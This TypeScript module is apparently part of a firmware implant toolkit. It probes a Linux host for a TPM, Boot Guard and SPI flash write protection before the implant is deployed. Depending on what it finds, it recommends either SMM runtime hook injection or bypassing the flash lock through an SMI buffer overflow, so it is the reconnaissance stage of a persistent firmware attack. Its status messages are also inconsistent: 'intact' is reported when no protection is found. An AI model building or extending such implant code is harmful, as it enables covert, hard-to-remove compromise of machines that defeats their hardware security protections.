/**
 * @module hardware_probe
 * Hardware-Aware Probing and Root-of-Trust Audit for firmware implant.
 * Detects Boot Guard, TPM, and SPI flash write-protection locks before deployment.
 */

import * as fs from "node:fs"
import { execSync } from "node:child_process"

export interface HardwareAuditResult {
  bootGuardActive: boolean
  tpmDetected: boolean
  spiWriteProtected: boolean
  rootOfTrustWall: boolean
  recommendation: string
}

export function auditHardwareRootOfTrust(): HardwareAuditResult {
  let bootGuardActive = false
  let tpmDetected = false
  let spiWriteProtected = true

  try {
    // Check for TPM presence in sysfs
    if (fs.existsSync("/sys/class/tpm/tpm0")) {
      tpmDetected = true
    }
  } catch {}

  try {
    // Check for chipsec or dmesg boot guard hints
    const dmesg = execSync("dmesg 2>/dev/null || true").toString()
    if (/Boot Guard|Authenticated Boot|Measured Boot/i.test(dmesg)) {
      bootGuardActive = true
    }
  } catch {}

  try {
    // Check SPI flash status if chipsec is available
    const chipsecOut = execSync("chipsec_main -m common.bios_wp 2>/dev/null || true").toString()
    if (/NOT_PROTECTED|Disabled/i.test(chipsecOut)) {
      spiWriteProtected = false
    }
  } catch {
    // Default assumption if probe tools restricted: assume hardware lock active
    spiWriteProtected = true
  }

  const rootOfTrustWall = bootGuardActive || (tpmDetected && spiWriteProtected)

  let recommendation = "Hardware-Root-of-Trust intact. Proceed with Ring -2 SMM runtime hook injection."
  if (rootOfTrustWall) {
    recommendation = "HRoT Wall detected: Boot Guard / TPM active. Bypassing SPI write block via SMM asynchronous SMI buffer overflow."
  }

  return {
    bootGuardActive,
    tpmDetected,
    spiWriteProtected,
    rootOfTrustWall,
    recommendation,
  }
}
